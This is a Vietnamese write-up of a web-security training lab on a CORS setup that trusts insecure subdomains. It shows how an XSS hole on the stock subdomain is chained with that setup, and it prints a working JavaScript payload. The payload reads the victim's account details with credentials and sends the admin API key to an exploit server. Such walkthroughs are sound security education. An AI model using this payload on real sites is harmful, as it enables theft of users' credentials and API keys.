## CORS vulnerability with trusted insecure protocols

***“This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.***

> Dịch sơ ra nghĩa là CORS sẽ trust all subdomain, mục đích vẫn là lấy APIKEY của admin và 
submit để solve lab.

Login vào web và bắt lại request ***accountDetail***

![](/imgs/CORS/16.png?raw=true)

Thử đổi origin lại thành domain khớp với domain của web thì web sẽ trả về response bình thường.

![](/imgs/CORS/17.png?raw=true)

Mình sẽ lấy ra subdomain trong lab này bằng cách bắt lại request checkstock hoặc lấy cái link popup nhảy ra từ check stock của bất kì 1 post nào.

![](/imgs/CORS/18.png?raw=true)

Ta sẽ nhận được subdomain là ***stock.domain***

![](/imgs/CORS/19.png?raw=true)

Do Cors không cho chuyển hướng đi đâu cả ngoài subdomain của web nên mình sẽ xác định chèn script vào chỗ nào đó có thể thực thi được (web cho sẵn XSS nha).

Ở đây mình sẽ chèn sau productId

![](/imgs/CORS/20.png?raw=true)
![](/imgs/CORS/21.png?raw=true)

Ok script thực hiện tốt, ta sẽ chèn 1 đoạn script gửi XMLHttprequest vào ngay param productId này và đưa sang exploit server :v

```javascript
<script>
   document.location="http://stock.ac221f871e65eee580783acd00e500f1.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ac221f871e65eee580783acd00e500f1.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-ac271fbb1ed5eef8804b3a7801dd002b.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

Thực hiện chèn script vào param bị nhiễm XSS để thu về giá trị trả về sau khi send request tới accountDetail

![](/imgs/CORS/22.png?raw=true)

Sau khi thu được admin ta sẽ submit apikey là solve lab

![](/imgs/CORS/23.png?raw=true)

